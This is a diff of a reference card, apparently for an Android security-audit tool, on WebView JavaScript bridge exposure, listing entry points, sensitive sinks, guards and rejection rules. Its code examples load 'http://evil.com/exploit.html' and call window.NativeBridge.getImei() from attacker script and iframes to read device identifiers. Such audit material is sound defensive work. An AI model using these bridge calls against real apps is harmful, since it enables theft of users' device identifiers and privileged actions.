@@ -1,51 +1,41 @@
-# Pattern: WebView JavaScript Bridge Exposure
+# Pattern: WebView JS Bridge
 
-## When To Use
+## Match
 
-Use this reference when attacker-controlled WebView content can reach `addJavascriptInterface`, `WebMessagePort`, `postMessage`, custom schemes, or bridge methods that call native app functionality.
+`WebView.addJavascriptInterface(Object, name)` exposes a Java object to JS in the WebView. Pre-API 17 every public method is reachable; API 17+ requires `@JavascriptInterface`. Non-obvious: the bridge is NOT partitioned per-origin — any `<iframe>` (including attacker-controlled) can call `window.<name>.foo()`. Cross-domain: callable from any page the WebView loads, including attacker `loadUrl(attackerUrl)` reached via `shouldOverrideUrlLoading` or IntentScheme redirect.
 
-## Core Concept
+## Analyze
 
-Untrusted web content crosses from renderer-controlled script into native app methods without origin, URL, or method-level authorization.
+- entry: `WebView.addJavascriptInterface`, `evaluateJavascript`, `loadUrl("javascript:...")`, `WebMessage` (Android M+), `postWebMessage`, content script
+- control: `name` of the bridge, called method name, argument type, JS context source, iframe/script content, URL loaded in the WebView, `WebSettings.setAllowFileAccess*` family
+- sink: `Settings` (`Settings.System.putString` for `ADB_ENABLED` etc.), `TelephonyManager` (`IMEI`, `IMSI`, `subscriberId`, `line1Number`, `networkOperator*`), `SmsManager`, `getRuntime().exec`, file I/O (`FileOutputStream` / `FileInputStream`), `PackageManager` (install/launch), `ContentResolver.query` / `openFile` to protected providers, `ClipboardManager`, `AccountManager`, callback to attacker JS
+- guard: `@JavascriptInterface` on every exposed method; reject any WebView that has `setAllowFileAccess(true)` AND loads remote URLs; do not let a JS bridge reach `Settings.Secure.ADB_ENABLED`; never use `addJavascriptInterface` when the WebView loads cross-origin/untrusted content
+- impact: read protected identifiers (IMEI/IMSI/SIM/Location), toggle `ADB_ENABLED`, write app-accessible files, install/launch packages, exfiltrate to attacker domain
 
-**Sources**
-- deep link, QR/scan result, redirect, remote config, push, or Intent-provided URL/HTML; `loadUrl`, `loadData`, `loadDataWithBaseURL`, `shouldOverrideUrlLoading`; web messages, injected JavaScript, custom scheme handlers.
+## Reject
 
-**Sinks**
-- `addJavascriptInterface` annotated methods; bridge methods reading files, tokens, cookies, account state, contacts, location, or starting components; `evaluateJavascript` with untrusted data that reaches bridge/native code.
+Reject when the bridge object has no privileged methods, the WebView loads only trusted URLs and the bridge is not exposed to cross-origin JS, or the methods lack `@JavascriptInterface`.
 
-## Guards & Rejection
+## Codes
 
-Safe when: only trusted origins load with bridge enabled, navigation is pinned after redirects, bridge is removed for untrusted content, bridge methods enforce authorization, and mixed/file content cannot inject script.
-
-Reject when: attacker cannot execute script in the bridged WebView, the bridge is disabled before untrusted loads, methods are harmless, or origin validation is exact and enforced before bridge exposure.
-
-## Rating
-
-- HIGH: credential/token/data theft or native privileged action.
-- MEDIUM: bounded native action or local app-only bridge abuse.
-- LOW: low-value info leak or weak UI manipulation.
-- IGNORED: WebView setting exists but attacker-controlled content cannot reach the bridge.
-
-## Trace Commands
-
-```bash
-decx code xref-method "android.webkit.WebView.addJavascriptInterface(java.lang.Object,java.lang.String):void" -P <port>
-decx code method-source "<bridgeMethod>" -P <port>
+```java
+// bridge exposes private identifier — reachable from any JS in the WebView (cross-origin and iframe-reachable)
+@JavascriptInterface
+public String getImei() { return ((TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId(); }
+webView.addJavascriptInterface(new JSInterface(this), "NativeBridge");
 ```
 
-## Example Shapes
-
-Suspicious:
-
-```text
-deep link URL -> loadUrl(attacker page) -> addJavascriptInterface -> bridge.getToken()
+```java
+// attacker loads the bridge from an attacker-controlled URL
+webView.loadUrl("http://evil.com/exploit.html");
 ```
 
-Safe:
-
-```text
-trusted origin allowlist -> bridge enabled only after verified navigation -> method-level auth
+```javascript
+// exploit from inside the loaded page — bridges are reachable from any origin/iframe
+window.NativeBridge.getImei();
 ```
 
-Report guidance -- Use: "Attacker-controlled WebView content can invoke a JavaScript bridge method that exposes sensitive native app functionality." Avoid: "JavaScript bridge exists" without proving attacker-controlled content can call security-sensitive bridge methods.
+```javascript
+// iframe content reaches the same bridge (no per-origin partitioning)
+<iframe src="http://evil.com/exploit.html" />
+```
